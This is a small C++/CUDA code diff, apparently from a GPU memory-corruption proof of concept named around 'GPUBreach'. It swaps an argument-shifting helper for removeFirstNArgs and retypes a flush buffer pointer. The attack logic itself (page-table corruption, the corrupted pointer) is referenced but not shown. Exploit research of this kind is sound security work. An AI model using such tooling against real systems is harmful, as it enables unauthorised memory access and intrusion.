@@ -8,15 +8,6 @@
 #include <chrono>
 #include <thread>
 
-static void
-removeFirstArg (int &argc, char *argv[])
-{
-  for (int i = 1; i < argc; ++i)
-    argv[i - 1] = argv[i];
-  argc -= 1;
-  argv[argc] = nullptr;
-}
-
 int
 main (int argc, char *argv[])
 {
@@ -26,13 +17,13 @@ main (int argc, char *argv[])
     return 0;
   }
   std::string transfer_app_cmd = argv[argc-1];
-  removeFirstArg (argc, argv);
+  removeFirstNArgs (argc, argv, 1);
   GPUBreachContext ctx = second_PT_region (argc, argv);
 
   auto &cudaMalloced_ptrs = ctx.step4_data.cudaMalloced_ptrs;
   auto &corrupted_ptr = ctx.step3_data.corrupted_ptr;
   
-  char * flush_ptr;
+  uint8_t * flush_ptr;
   uint8_t *data_device_ptr;
   uint64_t flush_size = 3L * 1024 * 1024 * 1024;
   cudaMallocManaged(&flush_ptr, flush_size);
